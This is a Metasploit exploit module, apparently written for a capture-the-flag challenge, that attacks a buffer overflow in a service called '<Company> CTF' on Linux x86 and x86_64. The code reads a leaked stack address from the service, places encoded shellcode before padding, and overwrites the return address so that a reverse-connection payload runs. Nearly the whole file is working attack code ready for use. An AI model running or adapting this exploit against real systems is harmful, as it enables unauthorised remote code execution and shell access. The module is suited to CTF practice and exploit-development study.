##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '<Company> CTF Buffer Overflow',
      'Description'    => %q{
        This modules exploits a buffer overflow in <Company> CTF.
      },
      'Author'         =>
        [
          'Chapman Schleiss' # R3naissance
        ],
        'Targets'        =>
          [
            [ 'Linux x86',    
              { 
                'Arch' => ARCH_X86,
                exploit: :exploit_x86
              }
            ],
            [ 'Linux x86_64', 
              { 
               'Arch' => ARCH_X64,
                exploit: :exploit_x64
              }
            ]
          ],
      'Payload'        =>
        {
          'BadChars'    => '\xcc\x00',
          'Compat'      =>
            {
              'ConnectionType' => 'reverse'
            }
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'       => 'linux',
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 05 2018',
      'DefaultTarget'  => 0
      )
    )

  end

  def exploit
    unless respond_to?(target[:exploit], true)
      fail_with(Failure::NoTarget, "Invalid target specified")
    end

    connect

    buf = send(target[:exploit])

    print_status("Sending #{buf.length} byte exploit")

    sock.put(buf)
    handler
    disconnect
  end

  def exploit_x64
    s = sock.get
    s = s.match('0x[0-9a-f]{12}')[0]
    print_status("Found buffer address (#{s})")
    buf = payload.encoded
    buf += "A" * (280 - payload.encoded.length)
    buf += [s.to_i(16)].pack('Q')
  end

  def exploit_x86
    s = sock.get
    s = s.match('0x[0-9a-f]{8}')[0]
    print_status("Found buffer address (#{s})")
    buf = payload.encoded
    buf += "A" * (272 - payload.encoded.length)
    buf += [s.to_i(16)].pack('V')
  end
end
